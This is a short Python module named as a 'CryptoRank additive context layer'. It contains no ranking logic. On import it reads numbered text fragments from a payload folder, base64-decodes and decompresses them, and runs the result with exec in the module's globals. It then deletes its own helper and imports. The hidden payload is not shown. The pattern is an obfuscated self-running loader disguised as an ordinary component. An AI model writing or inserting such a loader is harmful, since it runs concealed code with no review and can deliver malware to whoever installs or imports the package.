"""CryptoRank additive context layer."""
from __future__ import annotations

import base64
import zlib
from pathlib import Path

def _bootstrap():
    payload_dir = Path(__file__).resolve().parent / "cryptorank_payload"
    parts = [p.read_text().strip() for p in sorted(payload_dir.glob("p*.txt"))]
    src = zlib.decompress(base64.b64decode("".join(parts)))
    exec(compile(src, __file__, "exec"), globals())

_bootstrap()
del _bootstrap, base64, zlib, Path
